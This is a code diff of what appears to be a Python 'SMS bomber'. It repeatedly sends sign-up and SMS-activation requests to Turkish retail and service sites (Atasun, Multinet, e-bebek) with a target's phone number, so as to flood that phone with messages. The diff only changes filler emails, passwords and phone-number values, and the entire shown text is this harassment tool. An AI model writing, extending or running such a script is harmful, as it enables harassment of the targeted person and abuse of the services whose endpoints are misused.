@@ -131,10 +131,10 @@ def atasun():
    -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
    -H "DNT:1" \
    -H "Content-Type:application/x-www-form-urlencoded" \
-   -d "PermissionData[email]=asdasd@asfa.com" \
+   -d "PermissionData[email]=yoyo@asfa.com" \
    -d "PermissionData[gender]=Kadın" \
    -d "PermissionData[attribute01]=" \
-   -d "PermissionData[gsmphone]=0(533) 748 03 63" \
+   -d "PermissionData[gsmphone]=0(534) 848 95 84" \
    -d "mid=" \
    -d "userBirthYear=1991" \
    -d "userBirthDay=19" \
@@ -161,11 +161,11 @@ def multinet():
    -H "Content-Type:application/x-www-form-urlencoded" \
    -d "CheckAggrement=true" \
    -d "CheckAggrement=false" \
-   -d "Email=asdsadas@asdas.com" \
+   -d "Email=aopasdiasd@aklsd.com" \
    -d "Mobile=HEDEF TELEFON NUMARASI" \
    -d "Name=asdsad" \
-   -d "Password=22ywLZTJ68tVwLd" \
-   -d "RePassword=22ywLZTJ68tVwLd" \
+   -d "Password=klkaddopp22''" \
+   -d "RePassword=klkaddopp22" \
    -d "ReturnUrl=" \
    -d "SurName=asda" \
  'https://kullanici.multinet.com.tr/uyeol'| grep HTTP | awk '{print $2}'""").read()
@@ -194,7 +194,7 @@ def ebebek():
       print("#"*20, "E-BEBEK", "#"*20)
       kaç_defa += 1
       print("e-bebek deneme sayısı: ", kaç_defa)
-      ebebek = urllib.request.urlopen("https://www.e-bebek.com/sms/activation?email=asassaas%40aasdsad.com&phoneNumber=" + numara + "&smsAllow=false&country=TR&lang=tr")
+      ebebek = urllib.request.urlopen("https://www.e-bebek.com/sms/activation?email=sadasdasdsa%40asdsads.com&phoneNumber=" + numara + "&smsAllow=false&country=TR&lang=tr")
       if ebebek.getcode() == 200:
          print("mesaj gönderildi")
       else:
